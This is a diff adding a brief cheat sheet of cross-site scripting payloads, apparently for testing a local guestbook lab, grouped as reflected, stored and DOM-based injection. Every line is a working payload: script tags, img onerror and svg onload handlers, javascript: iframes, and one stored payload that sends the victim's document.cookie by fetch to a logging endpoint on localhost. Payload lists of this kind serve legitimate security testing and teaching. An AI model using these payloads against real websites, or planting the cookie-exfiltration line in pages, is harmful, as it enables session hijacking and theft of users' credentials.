@@ -1,0 +1,16 @@
+# CHEAT SHEET PAYLOAD CROSS-SITE SCRIPTING (XSS)
+
+1. Reflected XSS (Basic & Tag Injection):
+   <script>alert('XSS Reflected!')</script>
+   <img src=x onerror=alert(document.domain)>
+   <svg onload=alert(1)>
+   <input autofocus onfocus=alert(1)>
+
+2. Stored XSS (Persistent in Guestbook):
+   <script>alert('Stored XSS Executed: ' + document.cookie)</script>
+   <img src=invalid onerror="fetch('http://localhost:8000/log?c=' + encodeURIComponent(document.cookie))">
+
+3. DOM-Based XSS (Fragment # Injection):
+   #<img src=1 onerror=alert('DOM_XSS_Triggered')>
+   #<svg onload=alert(document.location)>
+   #<iframe src="javascript:alert(1)"></iframe>
